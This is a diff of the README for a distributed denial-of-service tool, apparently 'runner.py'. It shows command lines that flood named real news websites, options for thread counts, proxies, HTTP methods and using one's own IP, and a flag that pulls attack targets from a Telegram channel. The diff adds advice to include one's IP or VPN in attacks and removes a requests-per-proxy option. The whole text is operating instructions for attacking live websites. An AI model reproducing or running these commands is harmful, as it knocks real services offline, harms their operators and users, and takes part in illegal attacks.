@@ -63,6 +63,10 @@ To monitor information about the progress, add the `--debug` flag for the text, 
 
     python3 runner.py --debug https://ria.ru https://tass.ru
 
+Consider adding your IP/VPN to the attack (especially when running on dedicated server)
+
+    python3 runner.py https://ria.ru https://tass.ru --vpn
+
 To use targets provided by https://t.me/itarmyofukraine2022 add the `--itarmy` option  
 
     python3 runner.py --itarmy --debug
@@ -85,7 +89,6 @@ The script itself and installation instructions are here: https://github.com/por
                      [--table]
                      [--debug]
                      [--vpn]
-                     [--rpc RPC] 
                      [--http-methods METHOD [METHOD ...]]
                      [--itarmy]
                      [--copies COPIES]
@@ -97,10 +100,8 @@ The script itself and installation instructions are here: https://github.com/por
       -h, --help             show this help message and exit
       -c, --config URL|path  URL or local path to file with targets list
       -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
-      --table                Print log as table
-      --debug                Print log as text
+      --table / --debug      Print log as table / as text
       --vpn                  Use both my IP and proxies. Optionally, specify a percent of using my IP (default is 10%)
-      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
       --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use
       --http-methods GET     List of HTTP(L7) methods to use (default is GET + POST|STRESS).
       --itarmy               Attack targets from https://t.me/itarmyofukraine2022  
